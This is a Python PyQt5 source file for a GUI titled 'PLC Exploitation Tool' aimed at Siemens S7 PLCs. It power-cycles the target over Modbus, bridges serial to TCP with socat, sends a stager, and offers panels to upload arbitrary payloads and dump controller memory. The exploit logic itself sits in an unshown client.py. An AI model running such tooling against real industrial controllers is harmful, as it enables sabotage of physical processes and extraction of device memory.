import sys
import os # For path operations
import time # For timestamps in logging
from PyQt5.QtWidgets import (QApplication, QMainWindow, QStatusBar, QMenuBar, QAction, QVBoxLayout, QHBoxLayout, QWidget,
                             QGroupBox, QGridLayout, QLabel, QLineEdit, QPushButton, QComboBox,
                             QTabWidget, QTextEdit, QFileDialog, QProgressBar, QMessageBox, QSplitter, QCheckBox)
from PyQt5.QtCore import QThread, pyqtSignal, QProcess, Qt # For running socat
from PyQt5.QtGui import QColor # For log colors

# Attempt to import client functionalities
# Ensure the script's directory is in the Python path for robust client import
script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.insert(0, script_dir)

try:
    import client 
except ImportError as e:
    print(f"ERROR: client.py not found or failed to import. Ensure it's in the script's directory ({script_dir}) and has no errors. Detail: {e}")
    client = None
except Exception as e: # Catch other potential errors during import
    print(f"ERROR: An unexpected error occurred while importing client.py: {e}")
    client = None


class PLCExploitGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.client_instance = None # To hold PLCInterface instance
        self.socat_process = None # To hold socat QProcess instance
        self.program_log_entries = [] # To store (timestamp, level, message) tuples
        self.log_level_colors = {
            "DEBUG": QColor("gray"),
            "INFO": QColor("black"),
            "WARNING": QColor("orange"),
            "ERROR": QColor("red"),
            "CRITICAL": QColor("purple"),
        }
        self.setWindowTitle("PLC Exploitation Tool")
        self.setGeometry(100, 100, 800, 600)  # x, y, width, height

        self._create_menu_bar()
        self._create_status_bar()

        # Central widget and layout
        self.central_widget = QWidget()
        self.main_layout = QVBoxLayout(self.central_widget)
        self.setCentralWidget(self.central_widget)

        self._create_power_supply_group()
        self._create_connection_config_group()
        self._create_connection_management_group()
        self._create_dump_memory_group() # Corrected typo from self.dump_mem_group
        self._create_execute_payload_group() 
        self._create_terminal_outputs_group()

    def _create_menu_bar(self):
        self.menu_bar = QMenuBar(self)
        self.setMenuBar(self.menu_bar)

        # File menu
        file_menu = self.menu_bar.addMenu("&File")
        exit_action = QAction("&Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)

        # Help menu
        help_menu = self.menu_bar.addMenu("&Help")
        about_action = QAction("&About", self)
        # about_action.triggered.connect(self._show_about_dialog) # To be implemented
        help_menu.addAction(about_action)

    def _create_status_bar(self):
        self.status_bar = QStatusBar(self)
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")

    def _create_power_supply_group(self):
        power_supply_group = QGroupBox("Power Supply")
        layout = QGridLayout()

        # Modbus IP
        self.modbus_ip_label = QLabel("Modbus IP:")
        self.modbus_ip_input = QLineEdit("192.168.1.18")
        self.modbus_ip_input.setToolTip("IP address of the Modbus TCP power supply device.")
        layout.addWidget(self.modbus_ip_label, 0, 0)
        layout.addWidget(self.modbus_ip_input, 0, 1)

        # Modbus Port
        self.modbus_port_label = QLabel("Modbus Port:")
        self.modbus_port_input = QLineEdit("502")
        self.modbus_port_input.setToolTip("Port of the Modbus TCP power supply device.")
        layout.addWidget(self.modbus_port_label, 1, 0)
        layout.addWidget(self.modbus_port_input, 1, 1)

        # Modbus Output
        self.modbus_output_label = QLabel("Modbus Output:")
        self.modbus_output_input = QLineEdit("1") # Default to an example output
        self.modbus_output_input.setToolTip("Modbus coil/output number to control.")
        layout.addWidget(self.modbus_output_label, 2, 0)
        layout.addWidget(self.modbus_output_input, 2, 1)

        # Power Supply Delay
        self.power_delay_label = QLabel("Power ON Delay (ms):")
        self.power_delay_input = QLineEdit("1000") # Default to 1 second
        self.power_delay_input.setToolTip("Delay in milliseconds before turning power ON after turning it OFF.")
        layout.addWidget(self.power_delay_label, 3, 0)
        layout.addWidget(self.power_delay_input, 3, 1)

        # Power ON Button
        self.power_on_button = QPushButton("Power ON")
        self.power_on_button.setToolTip("Manually turn the power supply ON.")
        self.power_on_button.clicked.connect(self._power_on)
        layout.addWidget(self.power_on_button, 4, 0)

        # Power OFF Button
        self.power_off_button = QPushButton("Power OFF")
        self.power_off_button.setToolTip("Manually turn the power supply OFF.")
        self.power_off_button.clicked.connect(self._power_off)
        layout.addWidget(self.power_off_button, 4, 1)

        power_supply_group.setLayout(layout)
        self.main_layout.addWidget(power_supply_group)

    def _create_connection_config_group(self):
        connection_group = QGroupBox("Connection Configuration")
        layout = QGridLayout()

        # Socat TCP Forward Port
        self.socat_port_label = QLabel("Forwarded TCP Port:")
        self.socat_port_input = QLineEdit("1238") # Default from start.sh
        self.socat_port_input.setToolTip("Local TCP port that socat will forward to the serial device.")
        layout.addWidget(self.socat_port_label, 0, 0)
        layout.addWidget(self.socat_port_input, 0, 1)

        # ttyUSB Selection
        self.tty_label = QLabel("Serial Device (ttyUSB):")
        self.tty_combo = QComboBox()
        # Populate with common options, autodetect will refresh this
        for i in range(4): # Add ttyUSB0 to ttyUSB3
            self.tty_combo.addItem(f"/dev/ttyUSB{i}")
        self.tty_combo.setToolTip("Select the ttyUSB serial device connected to the PLC.")
        layout.addWidget(self.tty_label, 1, 0)
        layout.addWidget(self.tty_combo, 1, 1)

        # Autodetect Devices Button
        self.autodetect_button = QPushButton("Autodetect Devices")
        self.autodetect_button.setToolTip("Attempt to find connected serial devices (e.g., /dev/ttyUSB*).")
        self.autodetect_button.clicked.connect(self._autodetect_devices)
        layout.addWidget(self.autodetect_button, 2, 0, 1, 2) # Span button across two columns

        connection_group.setLayout(layout)
        self.main_layout.addWidget(connection_group)

    def _create_connection_management_group(self):
        management_group = QGroupBox("PLC Connection")
        layout = QGridLayout() # Using GridLayout for potentially more items later

        # Socat Control Buttons
        self.start_socat_button = QPushButton("Start Socat")
        self.start_socat_button.setToolTip("Manually start the socat process.")
        self.start_socat_button.clicked.connect(self._start_socat_manual)
        layout.addWidget(self.start_socat_button, 0, 0)

        self.stop_socat_button = QPushButton("Stop Socat")
        self.stop_socat_button.setToolTip("Manually stop the socat process.")
        self.stop_socat_button.clicked.connect(self._stop_socat_manual)
        self.stop_socat_button.setEnabled(False) # Initially disabled
        layout.addWidget(self.stop_socat_button, 0, 1)

        # PLC Connection Buttons
        self.connect_button = QPushButton("Connect to PLC")
        self.connect_button.setToolTip("Connect to PLC (socat must be running).")
        self.connect_button.clicked.connect(self._connect_plc)
        self.connect_button.setEnabled(False) # Initially disabled until socat is running
        layout.addWidget(self.connect_button, 1, 0)

        self.disconnect_button = QPushButton("Disconnect PLC")
        self.disconnect_button.setToolTip("Send bye() command to PLC and stop socat.")
        self.disconnect_button.clicked.connect(self._disconnect_plc)
        self.disconnect_button.setEnabled(False) # Initially disabled until connected
        layout.addWidget(self.disconnect_button, 1, 1)


        management_group.setLayout(layout)
        self.main_layout.addWidget(management_group)

    def _start_socat_manual(self):
        if self._start_socat():
            self.start_socat_button.setEnabled(False)
            self.stop_socat_button.setEnabled(True)
            self.connect_button.setEnabled(True) # Enable PLC connect once socat is up
            self.status_bar.showMessage("socat started manually.")
        else:
            self.status_bar.showMessage("Failed to start socat manually.")
            # _start_socat logs errors, _handle_socat_failure might also be called if QProcess fails to start

    def _stop_socat_manual(self):
        self._stop_socat() # This method handles logging and process cleanup
        self.start_socat_button.setEnabled(True)
        self.stop_socat_button.setEnabled(False)
        self.connect_button.setEnabled(False) # Disable PLC connect if socat is stopped
        self.disconnect_button.setEnabled(False) # Also ensure disconnect is disabled
        # Disable payload/dump buttons as well
        self.start_dump_button.setEnabled(False)
        self.execute_payload_button.setEnabled(False)
        self.status_bar.showMessage("socat stopped manually.")


    def _autodetect_devices(self):
        self._log_to_program_output("Autodetecting serial devices...", "INFO")
        self.tty_combo.clear()
        
        # Common patterns for serial devices on Linux
        # For Windows, it would be "COM1", "COM2", etc.
        # For macOS, it's often /dev/tty.usbserial-* or /dev/tty.usbmodem-*
        
        # Simple glob-based detection for Linux
        import glob
        potential_devices = []
        for pattern in ["/dev/ttyUSB*", "/dev/ttyACM*", "/dev/ttyS*"]:
            potential_devices.extend(glob.glob(pattern))
        
        if not potential_devices:
            self._log_to_program_output("No common serial devices found automatically. Please enter manually if needed.", "WARNING")
            self.tty_combo.addItem("") # Add a blank item
        else:
            for device in sorted(list(set(potential_devices))): # Sort and unique
                self.tty_combo.addItem(device)
                self._log_to_program_output(f"Found: {device}", "INFO")
        
        self.status_bar.showMessage(f"Device detection complete. Found {len(potential_devices)} potential devices.")

    # def _show_about_dialog(self):
    #     QMessageBox.about(self, "About PLC Exploitation Tool",
    #                       "A GUI tool for interacting with Siemens S7 PLCs.")

    def _create_execute_payload_group(self):
        execute_group = QGroupBox("Execute Generic Payload")
        layout = QGridLayout()

        # Payload File
        self.gen_payload_label = QLabel("Payload File (.bin):")
        self.gen_payload_path_input = QLineEdit()
        self.gen_payload_path_input.setPlaceholderText("Select payload file...")
        self.gen_payload_path_input.setReadOnly(True)
        self.gen_payload_browse_button = QPushButton("Browse...")
        self.gen_payload_browse_button.setToolTip("Select the .bin payload file to execute.")
        self.gen_payload_browse_button.clicked.connect(self._browse_generic_payload)
        layout.addWidget(self.gen_payload_label, 0, 0)
        layout.addWidget(self.gen_payload_path_input, 0, 1)
        layout.addWidget(self.gen_payload_browse_button, 0, 2)

        # Arguments
        self.gen_payload_args_label = QLabel("Arguments (optional):")
        self.gen_payload_args_input = QLineEdit()
        self.gen_payload_args_input.setToolTip("Optional arguments to pass to the payload.")
        layout.addWidget(self.gen_payload_args_label, 1, 0)
        layout.addWidget(self.gen_payload_args_input, 1, 1, 1, 2) # Span input across 2 columns

        # Execute Payload Button
        self.execute_payload_button = QPushButton("Execute Payload")
        self.execute_payload_button.setToolTip("Upload and execute the selected payload.")
        self.execute_payload_button.clicked.connect(self._execute_generic_payload)
        self.execute_payload_button.setEnabled(False) # Disabled until connected and in special mode
        layout.addWidget(self.execute_payload_button, 2, 0, 1, 3) # Span across columns

        execute_group.setLayout(layout)
        self.main_layout.addWidget(execute_group)

    def _create_dump_memory_group(self):
        dump_group = QGroupBox("Memory Dump")
        layout = QGridLayout()

        # Start Address
        self.dump_addr_label = QLabel("Start Address (hex):")
        self.dump_addr_input = QLineEdit("0x10010100") # Default from client.py
        self.dump_addr_input.setToolTip("Starting memory address to dump (e.g., 0x10010100).")
        layout.addWidget(self.dump_addr_label, 0, 0)
        layout.addWidget(self.dump_addr_input, 0, 1)

        # Number of Bytes
        self.dump_len_label = QLabel("Number of Bytes:")
        self.dump_len_input = QLineEdit("1024") # Default sensible length
        self.dump_len_input.setToolTip("Number of bytes to dump from the start address.")
        layout.addWidget(self.dump_len_label, 1, 0)
        layout.addWidget(self.dump_len_input, 1, 1)

        # Dump Payload File
        self.dump_payload_label = QLabel("Dump Payload:")
        self.dump_payload_path_input = QLineEdit("payloads/dump_mem/build/dump_mem.bin") # Default
        self.dump_payload_path_input.setReadOnly(True)
        self.dump_payload_browse_button = QPushButton("Browse...")
        self.dump_payload_browse_button.setToolTip("Select the dump_mem.bin payload file.")
        self.dump_payload_browse_button.clicked.connect(self._browse_dump_payload)
        layout.addWidget(self.dump_payload_label, 2, 0)
        layout.addWidget(self.dump_payload_path_input, 2, 1)
        layout.addWidget(self.dump_payload_browse_button, 2, 2)

        # Save Dump As
        self.dump_output_label = QLabel("Save Dump As:")
        self.dump_output_path_input = QLineEdit("memory_dump.bin") # Default
        self.dump_output_path_input.setReadOnly(True)
        self.dump_output_browse_button = QPushButton("Browse...")
        self.dump_output_browse_button.setToolTip("Choose where to save the memory dump.")
        self.dump_output_browse_button.clicked.connect(self._browse_dump_output)
        layout.addWidget(self.dump_output_label, 3, 0)
        layout.addWidget(self.dump_output_path_input, 3, 1)
        layout.addWidget(self.dump_output_browse_button, 3, 2)
        
        # Start Dump Button
        self.start_dump_button = QPushButton("Start Dump")
        self.start_dump_button.setToolTip("Begin the memory dumping process.")
        # self.start_dump_button.clicked.connect(self._start_dump) # To be implemented
        self.start_dump_button.setEnabled(False) # Disabled until connected and in special mode
        layout.addWidget(self.start_dump_button, 4, 0, 1, 3) # Span across columns

        # Progress Bar
        self.dump_progress_bar = QProgressBar()
        self.dump_progress_bar.setValue(0)
        layout.addWidget(self.dump_progress_bar, 5, 0, 1, 3)

        # Statistics Labels
        self.dump_stats_layout = QGridLayout()
        self.dump_speed_label = QLabel("Speed: N/A")
        self.dump_elapsed_label = QLabel("Elapsed: 0s")
        self.dump_remaining_label = QLabel("ETA: N/A")
        self.dump_stats_layout.addWidget(self.dump_speed_label, 0, 0)
        self.dump_stats_layout.addWidget(self.dump_elapsed_label, 0, 1)
        self.dump_stats_layout.addWidget(self.dump_remaining_label, 0, 2)
        layout.addLayout(self.dump_stats_layout, 6, 0, 1, 3)


        dump_group.setLayout(layout)
        self.main_layout.addWidget(dump_group)


    def _create_terminal_outputs_group(self):
        terminal_group = QGroupBox("Terminal Outputs")
        terminal_layout = QVBoxLayout()

        # Splitter for side-by-side terminals
        splitter = QSplitter(Qt.Horizontal)

        # Socat Output Area
        socat_area_widget = QWidget()
        socat_layout = QVBoxLayout(socat_area_widget)
        socat_layout.setContentsMargins(0,0,0,0)

        socat_header_layout = QHBoxLayout()
        socat_label = QLabel("socat Output")
        self.socat_clear_button = QPushButton("Clear")
        self.socat_clear_button.clicked.connect(lambda: self.socat_output_terminal.clear())
        socat_header_layout.addWidget(socat_label)
        socat_header_layout.addStretch()
        socat_header_layout.addWidget(self.socat_clear_button)
        socat_layout.addLayout(socat_header_layout)

        self.socat_output_terminal = QTextEdit()
        self.socat_output_terminal.setReadOnly(True)
        self.socat_output_terminal.setLineWrapMode(QTextEdit.NoWrap) # NoWrap is often better for logs
        self.socat_output_terminal.setFontFamily("Monospace")
        socat_layout.addWidget(self.socat_output_terminal)
        splitter.addWidget(socat_area_widget)

        # Program Output Area
        program_area_widget = QWidget()
        program_layout = QVBoxLayout(program_area_widget)
        program_layout.setContentsMargins(0,0,0,0)

        program_header_layout = QHBoxLayout()
        program_label = QLabel("Program Output")
        program_header_layout.addWidget(program_label)
        program_header_layout.addStretch()

        self.log_filter_debug_cb = QCheckBox("Debug")
        self.log_filter_debug_cb.setChecked(True)
        self.log_filter_debug_cb.stateChanged.connect(self._update_program_log_display)
        program_header_layout.addWidget(self.log_filter_debug_cb)

        self.log_filter_info_cb = QCheckBox("Info")
        self.log_filter_info_cb.setChecked(True)
        self.log_filter_info_cb.stateChanged.connect(self._update_program_log_display)
        program_header_layout.addWidget(self.log_filter_info_cb)

        self.log_filter_warning_cb = QCheckBox("Warning")
        self.log_filter_warning_cb.setChecked(True)
        self.log_filter_warning_cb.stateChanged.connect(self._update_program_log_display)
        program_header_layout.addWidget(self.log_filter_warning_cb)

        self.log_filter_error_cb = QCheckBox("Error")
        self.log_filter_error_cb.setChecked(True)
        self.log_filter_error_cb.stateChanged.connect(self._update_program_log_display)
        program_header_layout.addWidget(self.log_filter_error_cb)

        self.program_clear_button = QPushButton("Clear")
        self.program_clear_button.clicked.connect(self._clear_program_log)
        program_header_layout.addWidget(self.program_clear_button)
        program_layout.addLayout(program_header_layout)

        self.program_output_terminal = QTextEdit()
        self.program_output_terminal.setReadOnly(True)
        self.program_output_terminal.setLineWrapMode(QTextEdit.NoWrap)
        self.program_output_terminal.setFontFamily("Monospace")
        program_layout.addWidget(self.program_output_terminal)
        splitter.addWidget(program_area_widget)

        splitter.setSizes([400, 400]) # Initial equal sizing
        terminal_layout.addWidget(splitter)
        terminal_group.setLayout(terminal_layout)
        
        self.main_layout.addWidget(terminal_group, 1) # Add with stretch factor

    def _clear_program_log(self):
        self.program_log_entries = []
        self._update_program_log_display()

    def _update_program_log_display(self):
        self.program_output_terminal.clear()

        show_debug = self.log_filter_debug_cb.isChecked()
        show_info = self.log_filter_info_cb.isChecked()
        show_warning = self.log_filter_warning_cb.isChecked()
        show_error = self.log_filter_error_cb.isChecked()

        for timestamp, level, message in self.program_log_entries:
            if (level == "DEBUG" and not show_debug) or \
               (level == "INFO" and not show_info) or \
               (level == "WARNING" and not show_warning) or \
               (level == "ERROR" and not show_error) or \
               (level == "CRITICAL" and not show_error): # CRITICAL shown with ERROR
                continue

            time_str = time.strftime("%H:%M:%S", time.localtime(timestamp))

            # Basic HTML for coloring
            color = self.log_level_colors.get(level, QColor("black"))
            # Ensure color.name() gives a valid hex string like #RRGGBB
            log_html = f'<font color="{color.name()}">[{time_str}] [{level}] {message}</font>'
            self.program_output_terminal.append(log_html)
            # self.program_output_terminal.append(f"[{time_str}] [{level}] {message}")


    # --- Action Methods ---

    def _show_message(self, title, message, level="info"):
        # Log message to program output as well
        log_level_map = {"info": "INFO", "warning": "WARNING", "error": "ERROR"}
        self._log_to_program_output(f"{title}: {message}", log_level_map.get(level, "INFO"))

        msg_box = QMessageBox(self)
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        if level == "info":
            msg_box.setIcon(QMessageBox.Information)
        elif level == "warning":
            msg_box.setIcon(QMessageBox.Warning)
        elif level == "error":
            msg_box.setIcon(QMessageBox.Critical)
        msg_box.exec_()

    def _log_to_program_output(self, message, level="INFO"):
        # Sanitize level to be one of the known keys if possible
        level = level.upper()
        if level not in self.log_level_colors:
            level = "INFO" # Default to INFO if unknown level is passed

        timestamp = time.time()
        self.program_log_entries.append((timestamp, level, message))
        self._update_program_log_display() # Refresh the display

    def _power_on(self):
        if not client:
            self._show_message("Error", "client.py module not loaded.", "error")
            return
        try:
            modbus_ip = self.modbus_ip_input.text()
            modbus_port = int(self.modbus_port_input.text())
            modbus_output = int(self.modbus_output_input.text())
            
            self._log_to_program_output(f"Attempting to power ON: {modbus_ip}:{modbus_port} output {modbus_output}", "INFO")
            if client.switch_power('on', modbus_ip, modbus_port, modbus_output):
                self._log_to_program_output("Power ON command successful.", "INFO")
                self.status_bar.showMessage("Power ON successful.")
            else:
                self._log_to_program_output("Power ON command failed. Check logs/Modbus settings.", "ERROR")
                self._show_message("Power Control", "Failed to turn power ON. Check Modbus settings and connection.", "error")
        except ValueError:
            self._show_message("Input Error", "Modbus port and output must be integers.", "error")
        except Exception as e:
            self._show_message("Power Control Error", f"An error occurred: {e}", "error")
            self._log_to_program_output(f"Error during power ON: {e}", "ERROR")

    def _power_off(self):
        if not client:
            self._show_message("Error", "client.py module not loaded.", "error")
            return
        try:
            modbus_ip = self.modbus_ip_input.text()
            modbus_port = int(self.modbus_port_input.text())
            modbus_output = int(self.modbus_output_input.text())

            self._log_to_program_output(f"Attempting to power OFF: {modbus_ip}:{modbus_port} output {modbus_output}", "INFO")
            if client.switch_power('off', modbus_ip, modbus_port, modbus_output):
                self._log_to_program_output("Power OFF command successful.", "INFO")
                self.status_bar.showMessage("Power OFF successful.")
            else:
                self._log_to_program_output("Power OFF command failed. Check logs/Modbus settings.", "ERROR")
                self._show_message("Power Control", "Failed to turn power OFF. Check Modbus settings and connection.", "error")
        except ValueError:
            self._show_message("Input Error", "Modbus port and output must be integers.", "error")
        except Exception as e:
            self._show_message("Power Control Error", f"An error occurred: {e}", "error")
            self._log_to_program_output(f"Error during power OFF: {e}", "ERROR")

    def _browse_file(self, caption, directory, file_filter, line_edit_widget):
        # Use os.path.expanduser to start in user's home directory if 'directory' is empty or not specific
        start_dir = os.path.expanduser(directory if directory else "~")
        file_name, _ = QFileDialog.getOpenFileName(self, caption, start_dir, file_filter)
        if file_name:
            line_edit_widget.setText(file_name)
            self._log_to_program_output(f"{caption} selected: {file_name}", "INFO")

    def _browse_save_file(self, caption, directory, file_filter, line_edit_widget):
        start_dir = os.path.expanduser(directory if directory else "~")
        file_name, _ = QFileDialog.getSaveFileName(self, caption, start_dir, file_filter)
        if file_name:
            line_edit_widget.setText(file_name)
            self._log_to_program_output(f"Output file selected: {file_name}", "INFO")


    def _browse_dump_payload(self):
        self._browse_file("Select Dump Payload File", "./payloads/dump_mem/build/", 
                          "Binary files (*.bin);;All files (*)", 
                          self.dump_payload_path_input)

    def _browse_dump_output(self):
        self._browse_save_file("Save Memory Dump As", "./", 
                               "Binary files (*.bin);;All files (*)", 
                               self.dump_output_path_input)

    def _browse_generic_payload(self):
        self._browse_file("Select Generic Payload File", "./payloads/", 
                          "Binary files (*.bin);;All files (*)", 
                          self.gen_payload_path_input)

    # --- socat Process Handlers ---
    def _socat_ready_read_stdout(self):
        output = self.socat_process.readAllStandardOutput().data().decode(errors='ignore')
        self.socat_output_terminal.append(output)

    def _socat_ready_read_stderr(self):
        error_output = self.socat_process.readAllStandardError().data().decode(errors='ignore')
        self.socat_output_terminal.append(f"<font color='red'>{error_output}</font>") # Show errors in red
        self._log_to_program_output(f"socat STDERR: {error_output.strip()}", "ERROR")


    def _socat_finished(self, exit_code, exit_status):
        log_message = f"socat process finished. Exit code: {exit_code}, Status: {exit_status}"
        level = "INFO" if exit_status == QProcess.NormalExit and exit_code == 0 else "ERROR"
        self._log_to_program_output(log_message, level)
        self.socat_output_terminal.append(f"<b>{log_message}</b>")

        # Update UI elements to reflect socat is no longer running
        self.start_socat_button.setEnabled(True)
        self.stop_socat_button.setEnabled(False)
        self.connect_button.setEnabled(False) # Can't connect if socat died
        self.disconnect_button.setEnabled(False) # Can't be connected if socat died

        # Also disable payload/dump buttons if socat dies unexpectedly
        self.start_dump_button.setEnabled(False)
        self.execute_payload_button.setEnabled(False)

        # If client was connected, it's now effectively disconnected
        if self.client_instance:
            self._log_to_program_output("PLC connection lost due to socat process termination.", "WARNING")
            self.client_instance.disconnect() # Close socket if open
            self.client_instance = None
            self.status_bar.showMessage("Disconnected from PLC (socat stopped).")


    def _start_socat(self):
        if self.socat_process and self.socat_process.state() == QProcess.Running:
            self._log_to_program_output("socat is already running.", "INFO")
            return True

        self.socat_process = QProcess(self)
        self.socat_process.readyReadStandardOutput.connect(self._socat_ready_read_stdout)
        self.socat_process.readyReadStandardError.connect(self._socat_ready_read_stderr)
        self.socat_process.finished.connect(self._socat_finished) # This will update buttons on finish
        # Connect error signal for more robust error handling if QProcess itself fails (e.g., command not found)
        self.socat_process.errorOccurred.connect(self._handle_socat_process_error)


        serial_dev = self.tty_combo.currentText()
        forward_port = self.socat_port_input.text()
        
        if not serial_dev:
            self._log_to_program_output("No serial device selected for socat.", "ERROR")
            self._show_message("Socat Error", "No serial device selected. Cannot start socat.", "error")
            return False
        if not forward_port.isdigit():
            self._log_to_program_output(f"Invalid forward port for socat: {forward_port}", "ERROR")
            self._show_message("Socat Error", "Forward port must be a number.", "error")
            return False

        # Ensure stty settings from start.sh are applied.
        # This might require running stty as a separate command or ensuring socat itself can set these.
        # For simplicity, we assume socat can handle raw params or stty is pre-configured.
        # A more robust solution might run `stty` command first.
        # stty -F ${SERIAL_DEV} cs8 38400 ignbrk -brkint -icrnl -imaxbel -opost -onlcr -isig -icanon -iexten -echo -echoe -echok -echoctl -echoke  -ixon -crtscts -parodd parenb raw
        # socat -v -b 4 -x TCP-LISTEN:1238,fork,reuseaddr ${SERIAL_DEV}
        
        # Basic socat command
        # TODO: Add verbosity and other options from start.sh if necessary
        # socat_cmd = f"socat TCP-LISTEN:{forward_port},fork,reuseaddr {serial_dev},raw,echo=0,b38400"
        # Using PTY to better emulate start.sh behavior for stty settings, though socat might override some.
        # The command from start.sh is: socat -v -b 4 -x TCP-LISTEN:1238,fork,reuseaddr ${SERIAL_DEV}
        # For QProcess, it's better to separate program and arguments
        program = "socat"
        arguments = [
            "-v", # verbose
            "-b", "4", # buffer size (example, might not be critical here)
            "-x", # hex output for data
            f"TCP-LISTEN:{forward_port},bind=localhost,fork,reuseaddr", # Bind to localhost
            f"{serial_dev}" # socat should apply raw settings by default to serial TTYs
        ]
        # Pre-configure serial port using stty (Important!)
        stty_program = "stty"
        stty_args = [
            "-F", serial_dev,
            "cs8", "38400", "ignbrk", "-brkint", "-icrnl", "-imaxbel",
            "-opost", "-onlcr", "-isig", "-icanon", "-iexten",
            "-echo", "-echoe", "-echok", "-echoctl", "-echoke",
            "-ixon", "-crtscts", "-parodd", "parenb", "raw"
        ]
        self._log_to_program_output(f"Configuring {serial_dev} with stty: {' '.join(stty_args)}", "DEBUG")
        stty_process = QProcess()
        stty_process.start(stty_program, stty_args)
        stty_process.waitForFinished(5000) # Wait up to 5s
        if stty_process.exitStatus() != QProcess.NormalExit or stty_process.exitCode() != 0:
            err_msg = stty_process.readAllStandardError().data().decode(errors='ignore')
            self._log_to_program_output(f"stty configuration failed for {serial_dev}: {err_msg}", "WARNING")
            self.socat_output_terminal.append(f"<font color='orange'><b>stty failed: {err_msg}</b></font>")
            # return False # Allow socat to try anyway, it might still work depending on existing config

        self._log_to_program_output(f"Starting socat: {program} {' '.join(arguments)}", "INFO")
        self.socat_output_terminal.append(f"<b>Starting socat: {program} {' '.join(arguments)}</b>")
        self.socat_process.start(program, arguments)
        
        if not self.socat_process.waitForStarted(5000): # Wait 5s for socat to start
            error_msg = self.socat_process.errorString()
            self._log_to_program_output(f"Failed to start socat: {error_msg}", "ERROR")
            self.socat_output_terminal.append(f"<font color='red'><b>Failed to start socat: {error_msg}</b></font>")
            # self.socat_process.finished will handle button states if it emits.
            # If waitForStarted fails, finished might not be called, so ensure states are reset.
            self._reset_socat_ui_to_stopped_state()
            self.socat_process = None
            return False
        
        self._log_to_program_output("socat process started.", "INFO")
        # UI update for successful start is handled by _start_socat_manual or _connect_plc
        return True

    def _handle_socat_process_error(self, error):
        # This handles errors like "socat command not found"
        error_string = self.socat_process.errorString()
        self._log_to_program_output(f"QProcess error for socat: {error_string} (Enum: {error})", "CRITICAL")
        self.socat_output_terminal.append(f"<font color='red'><b>QProcess Critical Error: {error_string}</b></font>")
        self._reset_socat_ui_to_stopped_state()
        self.socat_process = None # Ensure it's cleared after a critical QProcess error

    def _reset_socat_ui_to_stopped_state(self):
        self.start_socat_button.setEnabled(True)
        self.stop_socat_button.setEnabled(False)
        self.connect_button.setEnabled(False)
        # self.disconnect_button remains as is, typically false if socat stopped

    def _stop_socat(self):
        if self.socat_process and self.socat_process.state() != QProcess.NotRunning:
            self._log_to_program_output("Stopping socat process...", "INFO")
            # Disconnect signals to prevent _socat_finished from being called due to manual stop,
            # as _stop_socat_manual will handle the UI updates.
            # However, if _stop_socat is called from elsewhere (e.g. on exit), we might want finished.
            # For now, let's assume _socat_finished is robust enough.
            # self.socat_process.finished.disconnect(self._socat_finished) # Careful with this

            self.socat_process.terminate()
            if not self.socat_process.waitForFinished(3000):
                self._log_to_program_output("socat did not terminate gracefully, killing...", "WARNING")
                self.socat_process.kill()
                self.socat_process.waitForFinished(1000)
            self._log_to_program_output("socat process stopped (or stop initiated).", "INFO")
            # _socat_finished signal will handle UI updates like enabling start button etc.
            # If it was killed, it should also emit finished.
        else:
            self._log_to_program_output("socat is not running or already stopped.", "DEBUG")

        # Explicitly clear and update UI here if _socat_finished doesn't cover all cases of stop
        if not (self.socat_process and self.socat_process.state() != QProcess.NotRunning):
            self._reset_socat_ui_to_stopped_state() # Ensure UI is reset if process was already gone
            self.socat_process = None


    def _connect_plc(self):
        if not client:
            self._show_message("Error", "client.py module not loaded.", "error")
            return

        if self.client_instance and self.client_instance.r:
            self._show_message("Info", "Already connected to PLC.", "info")
            return

        # Check if socat is running; if not, _start_socat() is called by _start_socat_manual()
        # or user should start it manually.
        if not self.socat_process or self.socat_process.state() != QProcess.Running:
            # Option 1: Try to start it automatically (current _start_socat handles this if called)
            # self._log_to_program_output("socat not running. Attempting to start socat before PLC connection...", "INFO")
            # if not self._start_socat(): # This would also update buttons
            #     self._show_message("Error", "Failed to start socat. Cannot connect to PLC.", "error")
            #     return
            # else: # socat started, update buttons related to socat
            #     self.start_socat_button.setEnabled(False)
            #     self.stop_socat_button.setEnabled(True)
            #     # connect_button is already true if socat started successfully.

            # Option 2: (Chosen for this implementation) Require manual start or already running
            self._show_message("Error", "socat is not running. Please start socat first.", "error")
            self._log_to_program_output("Connection to PLC aborted: socat is not running.", "ERROR")
            return

        # Disable connect button during connection attempt, enable disconnect after success
        self.connect_button.setEnabled(False)
        # self.disconnect_button.setEnabled(True) # Enable this after successful PLC connection by _handle_plc_connected

        # PLC connection logic will be in a thread
        self.status_bar.showMessage("Attempting to connect to PLC...")
        self._log_to_program_output("Starting PLC connection thread...", "INFO")
        
        # Placeholder for actual connection thread
        # For now, let's simulate success for UI testing purposes
        # In the real version, a QThread will be started here.
        self.connect_button.setEnabled(False) # Disable while attempting
        
        target_host = "localhost" # socat forwards to here
        try:
            target_port = int(self.socat_port_input.text())
        except ValueError:
            self._show_message("Input Error", "Socat TCP Forward Port must be an integer.", "error")
            self.connect_button.setEnabled(True)
            return

        # Default stager path, can be made configurable later if needed
        stager_payload_path = client.STAGER_PL_FILENAME 

        # Create and start the connection thread
        # Ensure any previous thread is not running or cleaned up, though typically not an issue if button logic is correct
        if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
            self._log_to_program_output("Connection attempt already in progress.", "WARNING")
            # Optionally re-enable connect button if it was stuck disabled, or show message
            # self.connect_button.setEnabled(True) 
            return

        self.connection_thread = PLCConnectionThread(target_host, target_port, stager_payload_path, self)
        self.connection_thread.connection_succeeded.connect(self._handle_plc_connected)
        self.connection_thread.connection_failed.connect(self._handle_plc_connection_error)
        self.connection_thread.finished.connect(self._on_connection_thread_finished) 
        
        self._log_to_program_output(f"Starting PLC connection thread for {target_host}:{target_port}...", "INFO")
        self.connection_thread.start()

    def _on_connection_thread_finished(self):
        self._log_to_program_output("PLC Connection thread has finished.", "DEBUG")
        # This handler is mostly for cleanup or logging. 
        # UI state should be primarily managed by _handle_plc_connected and _handle_plc_connection_error.
        # If the connect button is still disabled AND we are not connected, it means the thread might have
        # exited without emitting a success/failure signal properly or was interrupted.
        if not self.connect_button.isEnabled() and not self.disconnect_button.isEnabled(): # Corrected logic
             self._log_to_program_output("Connection thread finished, but GUI state suggests no active connection or attempt. Re-enabling connect button.", "WARNING")
             self.connect_button.setEnabled(True)


